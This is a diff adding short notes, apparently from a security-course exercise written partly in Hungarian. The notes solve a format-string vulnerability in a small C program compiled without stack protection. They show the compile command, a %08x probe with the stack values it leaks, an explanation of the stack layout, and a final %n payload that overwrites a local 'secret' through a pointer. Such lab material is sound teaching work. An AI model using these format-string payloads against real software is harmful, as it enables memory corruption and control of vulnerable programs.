@@ -1,0 +1,15 @@
+gcc -m32 gyak01.c -o gyak01 -DSECRET=18 -DMESSAGE=\"TheJobIsDone\" -fno-stack-protector
+
+gyak01
+
+./gyak01
+Give me an input:
+AAAAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+AAAAAAA00000100.f7714c20.f773b4b2.f775955c.f7759af0.ff7fdadc.00000012.41414141.25414141.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830
+
+A veremben a lokális változók egymás fölé pakolódnak. 414141... az input tömb
+Fölötte van a lokális secret
+Afölött meg a psecret, amelyen keresztül átírjuk secret értékét
+
+Megoldás:
+%08x.%08x.%08x.%08x.%08x.%n
